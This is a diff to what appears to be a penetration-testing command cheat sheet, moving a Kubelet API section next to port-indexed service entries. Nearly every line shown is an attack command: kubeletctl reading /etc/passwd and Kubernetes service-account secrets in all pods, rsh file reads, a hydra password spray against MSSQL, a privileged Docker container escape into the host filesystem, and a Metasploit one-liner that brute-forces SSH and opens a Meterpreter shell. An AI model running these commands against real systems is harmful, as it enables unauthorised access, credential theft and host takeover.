@@ -696,6 +696,11 @@ rlogin -l $USERNAME $TARGET
 +---------- Execute Commands ----------+
 rsh -l $USERNAME $TARGET cat /etc/passwd
 
+[*] (10249, 10250, 10256) Kubelet
++---------- Kubelet API ----------+
+kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
+kubeletctl -s $TARGET run "ls /run/secrets/kubernetes.io/serviceaccount /var/run/secrets/kubernetes.io/serviceaccount /secrets/kubernetes.io/serviceaccout" --all-pods
+
 [*] (1433) MSSQL
 +---------- Spray Service ----------+
 (hydra -I mssql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
@@ -924,10 +929,6 @@ cat /etc/mtab | grep -oP 'upperdir.*' | cut -d ',' -f1
 docker ps -a
 docker commit 35c090009763 tempimg
 docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh
-
-+---------- Kubelet API ----------+
-kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
-kubeletctl -s $TARGET run "ls /run/secrets/kubernetes.io/serviceaccount /var/run/secrets/kubernetes.io/serviceaccount /secrets/kubernetes.io/serviceaccout" --all-pods
 
 [*] Meterpreter
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
